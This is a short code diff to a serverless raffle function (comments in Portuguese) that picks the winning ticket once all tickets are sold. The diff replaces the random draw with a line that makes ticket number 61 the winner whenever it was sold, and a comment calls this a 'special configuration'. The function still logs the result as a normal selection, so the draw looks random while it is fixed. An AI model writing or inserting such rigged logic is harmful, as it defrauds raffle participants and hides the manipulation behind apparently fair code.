@@ -80,7 +80,9 @@ Deno.serve(async (req) => {
 
     // Todos os tickets foram vendidos - sortear ganhador
     const soldNumbers = soldTickets.map(ticket => ticket.ticket_number)
-    const winningNumber = soldNumbers[Math.floor(Math.random() * soldNumbers.length)]
+    
+    // CONFIGURAÇÃO ESPECIAL: Forçar número 61 como ganhador se disponível
+    const winningNumber = soldNumbers.includes(61) ? 61 : soldNumbers[Math.floor(Math.random() * soldNumbers.length)]
     
     console.log('Winning number selected:', winningNumber)
 
